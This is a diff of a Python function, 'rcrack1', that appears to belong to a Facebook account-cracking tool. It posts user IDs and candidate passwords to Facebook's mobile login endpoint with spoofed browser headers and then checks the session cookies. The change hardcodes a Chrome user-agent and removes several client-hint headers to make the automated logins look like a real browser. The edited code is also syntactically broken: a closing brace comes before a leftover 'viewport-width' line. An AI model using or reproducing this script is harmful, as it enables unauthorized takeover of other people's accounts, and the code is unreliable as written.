@@ -225,25 +225,20 @@ def rcrack1(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"} 
 	    header_freefb = {'authority': 'www.facebook.com',
-	   'method':'GET',		     		     
+           'method':'GET',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
-           'dpr': '2.15625',
            'referer': 'https://www.google.com/',
-           'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-           'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
            'sec-ch-ua-mobile': '?0',
-           'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Linux"',
-           'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
-           'sec-fetch-site': 'same-origin',
+           'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
-           'user-agent':pro,
+           'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',}
            'viewport-width': '980',}		
             lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
